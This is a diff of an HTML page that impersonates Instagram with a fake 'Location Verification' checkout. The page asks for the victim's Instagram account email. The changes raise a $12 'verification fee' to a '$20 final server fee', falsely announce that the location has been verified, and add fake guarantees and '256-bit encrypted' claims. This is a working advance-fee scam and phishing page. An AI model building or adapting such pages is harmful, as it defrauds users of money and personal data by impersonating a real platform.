@@ -2,339 +2,241 @@
 <html lang="en">
 
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Instagram Location Verification</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap"
-        rel="stylesheet">
+        rel="stylesheet" />
     <style>
         * {
+            box-sizing: border-box;
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
-            font-family: 'Poppins', sans-serif;
         }
 
         body {
-            background: linear-gradient(135deg, #833ab4, #fd1d1d, #fcb045);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
+            font-family: 'Poppins', sans-serif;
+            background-color: #fafafa;
+            padding: 30px 10px;
+            color: #333;
         }
 
         .container {
             max-width: 500px;
-            width: 100%;
-            background: white;
-            border-radius: 20px;
-            overflow: hidden;
-            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.2);
+            margin: auto;
+            background: #fff;
+            border-radius: 16px;
             padding: 30px;
-            text-align: center;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
         }
 
         .logo {
             display: flex;
-            justify-content: center;
             align-items: center;
-            gap: 10px;
+            justify-content: center;
             margin-bottom: 20px;
         }
 
         .logo-icon {
-            font-size: 28px;
-            background: linear-gradient(45deg, #405de6, #833ab4);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+            font-size: 40px;
+            color: #e1306c;
         }
 
         .logo-text {
-            font-size: 24px;
-            font-weight: 700;
-            background: linear-gradient(45deg, #405de6, #833ab4);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+            font-size: 22px;
+            font-weight: 600;
+            margin-left: 10px;
+            color: #222;
         }
 
         .product-title {
-            font-size: 26px;
-            font-weight: 700;
-            margin-bottom: 15px;
-            line-height: 1.3;
-            color: #333;
+            font-size: 22px;
+            text-align: center;
+            margin-bottom: 10px;
         }
 
         .product-description {
+            text-align: center;
             font-size: 16px;
-            line-height: 1.6;
-            margin-bottom: 25px;
             color: #555;
+            margin-bottom: 25px;
         }
 
         .profile-section {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            margin-bottom: 25px;
-            padding: 20px;
-            background: #fafafa;
-            border-radius: 15px;
-            border: 1px solid #eee;
-        }
-
-        .profile-pic {
-            width: 100px;
-            height: 100px;
-            border-radius: 50%;
-            margin-bottom: 15px;
-            border: 3px solid white;
-            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.1);
-            overflow: hidden;
+            text-align: center;
+            margin-bottom: 30px;
         }
 
         .profile-pic img {
-            width: 100%;
-            height: 100%;
+            width: 90px;
+            height: 90px;
+            border-radius: 50%;
             object-fit: cover;
+            margin-bottom: 10px;
         }
 
         .profile-name {
-            font-weight: 600;
             font-size: 18px;
-            margin-bottom: 5px;
-            color: #333;
-        }
-
-        .profile-bio {
-            font-size: 14px;
-            color: #777;
-            margin-bottom: 15px;
-            line-height: 1.4;
+            font-weight: 600;
+            margin-bottom: 10px;
         }
 
         .profile-stats {
             display: flex;
-            justify-content: center;
-            gap: 15px;
-            width: 100%;
-            margin-top: 10px;
+            justify-content: space-around;
+            font-size: 14px;
         }
 
         .stat {
             text-align: center;
-            padding: 12px;
-            background: white;
-            border-radius: 10px;
-            flex: 1;
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
         }
 
         .stat-value {
+            font-weight: bold;
             font-size: 18px;
-            font-weight: 700;
-            color: #405de6;
+            color: #000;
         }
 
         .stat-label {
-            font-size: 13px;
             color: #777;
         }
 
         .price-container {
-            background: linear-gradient(135deg, #405de6, #833ab4);
-            padding: 25px;
-            border-radius: 15px;
             text-align: center;
-            margin: 20px 0;
-            color: white;
-            box-shadow: 0 4px 15px rgba(131, 58, 180, 0.3);
+            margin-bottom: 30px;
         }
 
         .price-label {
-            font-size: 18px;
-            margin-bottom: 5px;
-            opacity: 0.9;
+            font-size: 16px;
+            font-weight: 500;
         }
 
         .price {
-            font-size: 42px;
+            font-size: 32px;
             font-weight: 700;
+            margin-top: 5px;
             margin-bottom: 5px;
         }
 
         .billing-cycle {
-            font-size: 15px;
-            opacity: 0.9;
+            font-size: 13px;
+            color: #888;
         }
 
         .benefits {
-            margin: 25px 0;
-            text-align: left;
+            margin-bottom: 30px;
         }
 
         .benefit {
             display: flex;
             align-items: center;
-            margin-bottom: 15px;
+            margin-bottom: 10px;
             font-size: 15px;
-            padding: 10px;
-            background: #f8f9fa;
-            border-radius: 10px;
+            color: #444;
         }
 
         .benefit i {
+            color: #4CAF50;
             margin-right: 10px;
-            color: #405de6;
-            font-size: 20px;
-            min-width: 30px;
         }
 
         .form-group {
             margin-bottom: 20px;
-            text-align: left;
         }
 
         .form-group label {
-            display: block;
-            margin-bottom: 8px;
             font-weight: 500;
-            color: #555;
+            display: block;
+            margin-bottom: 5px;
         }
 
         .form-control {
             width: 100%;
-            padding: 14px;
-            border: 1px solid #ddd;
-            border-radius: 10px;
-            font-size: 16px;
-            transition: all 0.3s;
-        }
-
-        .form-control:focus {
-            outline: none;
-            border-color: #833ab4;
-            box-shadow: 0 0 0 2px rgba(131, 58, 180, 0.2);
+            padding: 10px 12px;
+            font-size: 14px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
         }
 
         .checkbox-group {
             display: flex;
             align-items: flex-start;
+            font-size: 13px;
             margin-bottom: 20px;
         }
 
         .checkbox-group input {
-            margin-top: 5px;
+            margin-top: 2px;
             margin-right: 10px;
         }
 
-        .checkbox-group label {
-            font-size: 14px;
-            color: #666;
-            line-height: 1.5;
-        }
-
         .checkbox-group a {
-            color: #405de6;
+            color: #007BFF;
             text-decoration: none;
-            font-weight: 500;
         }
 
         .btn {
-            display: block;
-            width: 100%;
-            padding: 16px;
-            background: linear-gradient(to right, #405de6, #833ab4);
+            background-color: #e1306c;
             color: white;
+            padding: 12px;
             border: none;
-            border-radius: 10px;
-            font-size: 18px;
+            border-radius: 8px;
+            font-size: 16px;
             font-weight: 600;
             cursor: pointer;
-            transition: all 0.3s;
-            box-shadow: 0 4px 15px rgba(131, 58, 180, 0.3);
+            width: 100%;
         }
 
-        .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(131, 58, 180, 0.4);
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
         }
 
         .secure-payment {
             display: flex;
-            justify-content: center;
             align-items: center;
-            gap: 10px;
-            margin-top: 15px;
-            color: #666;
-            font-size: 14px;
+            justify-content: center;
+            font-size: 13px;
+            color: #555;
+            margin-top: 10px;
+        }
+
+        .secure-payment i {
+            margin-right: 6px;
+            color: #4CAF50;
         }
 
         .payment-icons {
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-            margin-top: 20px;
-            flex-wrap: wrap;
+            text-align: center;
+            margin-top: 10px;
         }
 
         .payment-icon {
-            font-size: 32px;
+            font-size: 28px;
+            margin: 0 5px;
             color: #555;
         }
 
         .guarantee {
-            display: flex;
-            align-items: center;
-            gap: 10px;
             margin-top: 20px;
-            padding: 12px;
-            background: #f0f8ff;
-            border-radius: 10px;
-            border-left: 4px solid #405de6;
-            text-align: left;
+            background: #f8f8f8;
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 13px;
+            display: flex;
+            align-items: flex-start;
         }
 
         .guarantee i {
-            font-size: 24px;
-            color: #405de6;
-            min-width: 30px;
+            color: #4CAF50;
+            margin-right: 8px;
+            margin-top: 2px;
         }
 
         .guarantee-text {
-            font-size: 14px;
+            flex: 1;
             color: #555;
-        }
-
-        /* Responsive adjustments */
-        @media (max-width: 480px) {
-            .container {
-                padding: 20px;
-            }
-
-            .product-title {
-                font-size: 22px;
-            }
-
-            .profile-pic {
-                width: 80px;
-                height: 80px;
-            }
-
-            .price {
-                font-size: 36px;
-            }
-
-            .benefit {
-                font-size: 14px;
-            }
-
-            .btn {
-                padding: 14px;
-                font-size: 16px;
-            }
         }
     </style>
 </head>
@@ -343,17 +245,17 @@
     <div class="container">
         <div class="logo">
             <i class="fab fa-instagram logo-icon"></i>
-            <div class="logo-text">Location Verification</div>
+            <div class="logo-text">Final Payment - Server Fee!</div>
         </div>
 
-        <h1 class="product-title">Verify Your Location & Unlock Full Instagram Features</h1>
+        <h1 class="product-title">Location Successfully Verified</h1>
 
-        <p class="product-description">Complete this one-time verification to secure your account and access all
-            Instagram features without restrictions.</p>
+        <p class="product-description">Your location has been successfully verified. To complete activation and cover
+            server costs, please submit the final payment of $20 USD.</p>
 
         <div class="profile-section">
             <div class="profile-pic">
-                <img src="/img.jpg" alt="Profile Picture">
+                <img src="/img.jpg" alt="Profile Picture" />
             </div>
 
             <div class="profile-name" id="profileName">@_naridon2011_</div>
@@ -375,44 +277,46 @@
         </div>
 
         <div class="price-container">
-            <div class="price-label">One-Time Verification Fee</div>
-            <div class="price">$12<span style="font-size: 24px"> USD</span></div>
+            <div class="price-label">Final Server Fee</div>
+            <div class="price">$20<span style="font-size: 24px"> USD</span></div>
             <div class="billing-cycle">No recurring charges • Instant activation</div>
         </div>
 
         <div class="benefits">
             <div class="benefit">
                 <i class="fas fa-globe-americas"></i>
-                <span>Verify your location to access all features</span>
+                <span>Access all Instagram features without restrictions</span>
             </div>
             <div class="benefit">
                 <i class="fas fa-shield-alt"></i>
-                <span>Protect your account from suspicious activity</span>
+                <span>Secure your account from unauthorized activity</span>
             </div>
             <div class="benefit">
                 <i class="fas fa-check-circle"></i>
-                <span>Complete verification in less than 2 minutes</span>
+                <span>One-time payment — no hidden fees</span>
             </div>
             <div class="benefit">
                 <i class="fas fa-lock"></i>
-                <span>Secure payment with 256-bit encryption</span>
+                <span>256-bit encrypted transaction</span>
             </div>
         </div>
 
         <form id="checkoutForm">
             <div class="form-group">
                 <label for="email">Email Address</label>
-                <input type="email" id="email" class="form-control" placeholder="Your Instagram account email" required>
+                <input type="email" id="email" class="form-control" placeholder="Your Instagram account email"
+                    required />
             </div>
 
             <div class="checkbox-group">
-                <input type="checkbox" id="terms" required>
-                <label for="terms">I agree to the <a href="#">Terms of Service</a> and understand this is a one-time $12
-                    USD payment for location verification.</label>
+                <input type="checkbox" id="terms" required />
+                <label for="terms">I agree to the <a href="#">Terms of Service</a> and understand this is a one-time $20
+                    USD
+                    payment for final server processing.</label>
             </div>
 
             <button type="submit" class="btn">
-                <i class="fas fa-check-circle"></i> Complete Verification - $12 USD
+                <i class="fas fa-credit-card"></i> Pay Final Fee - $20 USD
             </button>
 
             <div class="secure-payment">
@@ -431,8 +335,8 @@
             <div class="guarantee">
                 <i class="fas fa-shield-alt"></i>
                 <div class="guarantee-text">
-                    <strong>Money-back guarantee:</strong> If verification fails for any reason, you'll receive a full
-                    refund within 24 hours.
+                    <strong>Money-back guarantee:</strong> If activation fails, a full refund will be processed within
+                    24 hours.
                 </div>
             </div>
         </form>
@@ -447,7 +351,6 @@
             following: 103
         };
 
-        // Set profile data in the DOM
         document.getElementById('profileName').textContent = "@" + profileData.username;
         document.getElementById('postsValue').textContent = profileData.posts;
         document.getElementById('followersValue').textContent = profileData.followers;
@@ -457,7 +360,6 @@
         document.getElementById('checkoutForm').addEventListener('submit', function (e) {
             e.preventDefault();
 
-            // Form validation
             const email = document.getElementById('email').value;
 
             if (!email) {
@@ -465,25 +367,20 @@
                 return;
             }
 
-            // Simple email validation
             if (!/^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/.test(email)) {
                 alert('Please enter a valid email address.');
                 return;
             }
 
-            // Show processing message
             const btn = document.querySelector('.btn');
             const originalText = btn.innerHTML;
-            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verifying your location...';
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing payment...';
             btn.disabled = true;
 
-            // Simulate verification processing
             setTimeout(() => {
-                alert("Could not process request. You must be logged in.");
+                alert("Location has been successfully verified. Now you have to pay $20 USD as the final payment for server fee.");
                 btn.innerHTML = originalText;
                 btn.disabled = false;
-
-                // Reset form
                 document.getElementById('checkoutForm').reset();
             }, 2500);
         });
